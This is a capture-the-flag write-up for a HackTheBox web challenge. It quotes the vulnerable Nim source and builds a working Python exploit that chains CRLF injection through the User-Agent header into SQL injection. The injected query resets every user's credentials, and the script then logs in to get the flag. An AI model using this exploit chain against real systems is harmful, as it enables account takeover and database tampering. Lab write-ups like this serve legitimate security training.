Introduction


The box gives us a login prompt with fields of username and password.
At first i entered just random credentials and keeps giving me “browser not supported”.
Something does not feel right. Thankfully HackTheBox provides us with the machines files.
I inspected the files and found some things.








*The code given below is from main.vim. It describes a check for sql injection vulnerability*


*proc containsSqlInjection(input: string): bool =
  for c in input:
        let ordC = ord(c)
        if not ((ordC >= ord('a') and ordC <= ord('z')) or
                (ordC >= ord('A') and ordC <= ord('Z')) or
                (ordC >= ord('0') and ordC <= ord('9'))):
          return true
  return false*


While further inspecting the code i found that a vulnerability lies in a function called *decodeurl*. This function decodes the user-agent header. But it does not properly validate or sanitize the decoded value. This allows an attacker to inject CRLF characters to bypass the SQLInjection check.


*routes:
post "/user":
let username = @"username"
let password = @"password"
if containsSqlInjection(username) or containsSqlInjection(password):
resp msgjson("Malicious input detected")
let userAgent = decodeUrl(request.headers["user-agent"])
let jsonData = %*{
"username": username,
"password": password
}
let jsonStr = $jsonData


        let client = newHttpClient(userAgent)
        client.headers = newHttpHeaders({"Content-Type": "application/json"})


        let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)


        if response.code != Http200:
          resp msgjson(response.body.strip())
           
        resp msgjson(readFile("/flag.txt"))


runForever()*


Nim versions below 1.2.6 suffers from CRLF vulnerability.
In the Docker file at line 22 we can see the Nim version.
We can exploit this by modifying the user-agent header by including a CRLF seqeunce in the POST request.


The next step is to craft a script to check if the vulnerability can be exploited.


* def send_post_request(url, headers, data):
        x = requests.post(url, headers=headers, data=data)
        print(x.status_code)
        print(x.text)


headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        "User-Agent": "Mozilla/7.0%0d%0aHello: test",
}


payload = b"username=aaaa&password=aa"


send_post_request("http://94.237.54.42:47968/user", headers, payload)*


One thing to note is that i encoded /r/n to %0d%0a.
We get a header Hello back.


Performing SQL Injection.


I found that the frontend sends the body to the backend as json.
So the payload should be as of follows:
headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        "User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"' OR '1'='1\"}",
}


Note: the password is hashed with bcrypt! So we have to store the hashed version of the password to the database. To get a valid hash of the password, we can simply reproduce the same Go code and print out the hashed version of b, which turns out it is equal to $2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S 
The final thing to be aware of is that the request from frontend to backend will have a Content-Length that depends on the input username and password (the real ones, not the ones injected via the user-agent). If we do not pass any body, or if our username and password are too short, the request to the backend will be truncated and part of our payload will be lost. Therefore, it is important to send a body large enough to the frontend.
________________


The complete exploit is given below:
import requests


URL = "http://94.237.54.42:47968/user" # replace with your instance


def send_post_request(url, headers, data):
        x = requests.post(url, headers=headers, data=data)
        print(x.status_code)
        print(x.text)


# SQL Injection: set all users' usernames to `a` and passwords to `b`
send_post_request(
        URL,
        {
            'Content-Type': 'application/x-www-form-urlencoded',
            "User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"'; UPDATE users SET username = 'a', password = '$2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S' WHERE '1'='1\"}",
        },
        b"username=aaaa&password="+ b"a" * 1024 # the body should be at least as big as the payload in the user-agent header, otherwise errors will occur
)


# Getting the flag by performing a valid login
send_post_request(
        URL,
        {
            'Content-Type': 'application/x-www-form-urlencoded',
            "User-Agent": "Mozilla/7.0",
        },
        b"username=a&password=b"
)


The output should be as of follows:
*200
{"msg": "Invalid username or password"}
200
{"msg": "HTB{d0_th3_d45h_0n_th3_p4r53r}"}*


Hope you’ve find this writeup helpful.
And happy pwning.